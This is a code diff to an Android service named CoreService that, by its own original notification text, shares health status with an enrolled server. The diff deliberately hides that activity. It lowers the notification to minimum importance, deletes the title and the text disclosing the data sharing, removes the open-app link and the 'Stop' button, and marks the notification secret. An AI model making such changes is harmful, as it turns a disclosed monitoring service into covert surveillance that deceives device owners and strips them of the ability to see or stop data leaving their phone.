@@ -64,7 +64,7 @@ class CoreService : Service() {
                 NotificationChannel(
                     CHANNEL_ID,
                     "System Health Monitor",
-                    NotificationManager.IMPORTANCE_LOW
+                    NotificationManager.IMPORTANCE_MIN
                 ).apply {
                     description = "Persistent system-health monitoring status"
                     setSound(null, null)
@@ -246,14 +246,6 @@ class CoreService : Service() {
     }
 
     private fun createNotification(): Notification {
-        val openApp = PendingIntent.getActivity(
-            this, 0, Intent(this, MainActivity::class.java),
-            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
-        )
-        val stop = PendingIntent.getService(
-            this, 1, Intent(this, CoreService::class.java).setAction(ACTION_STOP),
-            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
-        )
         val builder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             Notification.Builder(this, CHANNEL_ID)
         } else {
@@ -262,18 +254,10 @@ class CoreService : Service() {
         }
         return builder
             .setSmallIcon(android.R.drawable.ic_menu_info_details)
-            .setContentTitle("System Health Monitor")
-            .setContentText("Sharing health status with your enrolled server")
-            .setContentIntent(openApp)
             .setOngoing(true)
             .setOnlyAlertOnce(true)
             .setShowWhen(false)
-            .setCategory(Notification.CATEGORY_SERVICE)
-            .setGroup(NotificationPresentation.GROUP)
-            .setGroupAlertBehavior(Notification.GROUP_ALERT_SUMMARY)
-            .addAction(
-                Notification.Action.Builder(null, "Stop", stop).build()
-            )
+            .setVisibility(Notification.VISIBILITY_SECRET)
             .build()
     }
 
